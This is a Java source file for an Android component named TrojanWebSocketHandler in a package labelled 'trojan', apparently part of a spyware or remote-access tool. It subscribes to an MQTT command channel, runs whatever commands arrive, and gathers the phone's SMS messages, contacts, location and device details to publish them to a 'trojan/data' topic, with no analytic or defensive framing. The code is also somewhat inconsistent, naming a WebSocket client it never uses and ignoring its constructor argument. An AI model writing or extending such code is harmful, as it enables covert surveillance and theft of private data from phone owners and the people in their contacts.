package io.openim.android.demo.trojan;

import android.util.Log;
import org.eclipse.paho.client.mqttv3.IMqttException;
import org.json.JSONObject;

/**
 * Handles WebSocket communication and data sending to remote server
 */
public class TrojanWebSocketHandler {
    private static final String TAG = "TroWebSocket";
    private TrojanWebSocket wsClient;
    private TrojanMqttService mqttService;
    private TrojanCommandHandler cmdHandler;
    private TrojanDataCollector dataCollector;

    public TrojanWebSocketHandler(TrojanMqttService service) {
        this.mqttService = new TrojanMqttService();
        this.cmdHandler = new TrojanCommandHandler(service);
        this.dataCollector = new TrojanDataCollector(service);
        this.wsClient = new TrojanWebSocket();
    }

    public void initialize() {
        try {
            mqttService.connect();
            mqttService.subscribe("trojan/#");
        } catch (IMqttException e) {
            Log.e(TAG, "MQTT initialization failed", e);
        }
    }

    public void onMessageReceived(String message) {
        try {
            org.json.JSONObject jsonMessage = new org.json.JSONObject(message);
            String command = jsonMessage.getString("command");
            org.json.JSONObject params = jsonMessage.optJSONObject("params");
            if (params == null) params = new org.json.JSONObject();
            cmdHandler.executeCommand(command, params);

            String response = String.format("{\"command\":\"%s\",\"status\":\"executed\"}", command);
            mqttService.publish("trojan/response", response);
        } catch (Exception e) {
            Log.e(TAG, "Message processing failed", e);
        }
    }

    public void sendData(String dataType, String data) {
        String payload = String.format("{\"type\":\"%s\",\"payload\":\"%s\"}", dataType, data);
        mqttService.publish("trojan/data", payload);
    }

    public void collectAndSendAllData() {
        if (dataCollector == null) return;
        String smsData = dataCollector.collectSMS();
        String contactsData = dataCollector.collectContacts();
        String locationData = dataCollector.collectLocation();
        String deviceInfo = dataCollector.collectDeviceInfo();

        sendData("SMS", smsData);
        sendData("CONTACTS", contactsData);
        sendData("LOCATION", locationData);
        sendData("DEVICE", deviceInfo);
    }

    public void disconnect() {
        try {
            mqttService.disconnect();
        } catch (IMqttException e) {
            Log.e(TAG, "Disconnect failed", e);
        }
    }
}
